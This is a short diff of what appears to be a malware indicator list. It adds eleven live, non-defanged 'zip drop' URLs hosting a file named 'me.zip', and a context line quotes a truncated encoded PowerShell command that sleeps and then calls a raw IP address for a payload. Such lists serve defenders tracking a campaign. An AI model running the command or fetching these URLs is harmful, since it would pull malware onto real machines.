@@ -19,7 +19,17 @@ powershell.exe -ENC Start-Sleep -Seconds 5;$Ghosting = ("http://87.236.146.34/7s
 
 zip drop urls:
 
-http://ldsinternacional.com/blo/6433a06b72f65.zip
+http://autonaprawa.org.pl/blo/me.zip
+http://availguide.com/blo/me.zip
+http://computaciontandil.com/blo/me.zip
+http://datasafe-services.co.uk/blo/me.zip
+http://globallinks-fas.com/blo/me.zip
+http://ldsinternacional.com/blo/me.zip
+http://megashops.com.br/blo/me.zip
+http://staging.tripscon.com/blo/me.zip
+http://tremac.hr/blo/me.zip
+http://ytdown.site/blo/me.zip
+http://zainmotors2008.com/blo/me.zip
 
 .dll drop urls
 
